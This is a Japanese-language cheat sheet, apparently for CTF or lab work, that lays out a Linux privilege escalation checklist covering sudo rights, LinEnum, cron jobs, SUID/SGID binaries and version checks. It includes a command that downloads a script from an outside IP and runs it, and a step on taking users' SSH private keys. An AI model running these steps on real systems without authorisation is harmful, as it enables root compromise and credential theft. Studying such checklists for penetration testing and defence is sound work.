# Linux Privilege Escalation

## 実行フロー
1. sudo -l の実行
2. LinEnum の実行
3. ホームディレクトリの確認
4. Cron の確認
5. SUID / SGID の確認
6. Bash のバージョン確認
7. Sudo のバージョン確認


## 1. sudo -l の実行
### root 権限で実行可能なコマンドが存在する場合
[GTFOBins](https://gtfobins.github.io/) で検索

### ユーザー環境から継承された環境変数が存在する場合
- LD_PRELOAD が存在する場合は[こちら](https://github.com/tipotto/CheatSheet/blob/main/privilege-escalation2.md#ld_preload-%E3%81%8C%E5%AD%98%E5%9C%A8%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88)  
- LD_LIBRARY_PATH が存在する場合は[こちら](https://github.com/tipotto/CheatSheet/blob/main/privilege-escalation2.md#ld_library_path-%E3%81%8C%E5%AD%98%E5%9C%A8%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88)

## 2. LinEnum の実行
```
wget http://10.4.49.251/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh
cd /tmp && ./LinEnum.sh
```

## 3. ホームディレクトリの確認
- [ ] 一般ユーザーは存在するか
- [ ] ディレクトリにアクセスできるか
- [ ] SSH 秘密鍵は取得できるか
- [ ] 手がかりとなるファイルは存在するか
- [ ] フラグとなるファイルは存在するか

## 4. Cron の確認
- [ ] Crontab に怪しいファイルは存在するか
- [ ] スクリプトのディレクトリは置き換え可能か
- [ ] スクリプトは書き換え可能か

存在する場合...
### 4-1. 指定方法がスクリプト名（絶対パスでない）の場合
環境変数 PATHの追加は[こちら](https://github.com/tipotto/CheatSheet/blob/main/privilege-escalation2.md#%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0-path)

### 4-2. 指定方法が絶対パスの場合
・ディレクトリに書き込み権限がある場合  
→スクリプトを置き換える

・ファイルに書き込み権限がある場合  
→スクリプトを書き換える

## 5. SUID / SGID の確認
- [ ] 既存の脆弱性（Exim <= 4.84-3 など）は存在するか
- [ ] スクリプトのディレクトリは置き換え可能か
- [ ] スクリプトは書き換え可能か
- [ ] 内部で実行されているプログラム（コマンド）はコマンド名で指定されている（絶対パスでない）か

・ディレクトリ、ファイルに書き込み権限がある場合  
共有オブジェクトの利用は[こちら](https://github.com/tipotto/CheatSheet/blob/main/privilege-escalation2.md#%E5%85%B1%E6%9C%89%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%81%AE%E5%88%A9%E7%94%A8)

・内部で実行されているプログラム（コマンド）がコマンド名で指定されている場合
環境変数の利用は[こちら](https://github.com/tipotto/CheatSheet/blob/main/privilege-escalation2.md#%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0)

## 6. Bash のバージョン確認
こちらを参照

## 7. Sudo のバージョン確認
こちらを参照


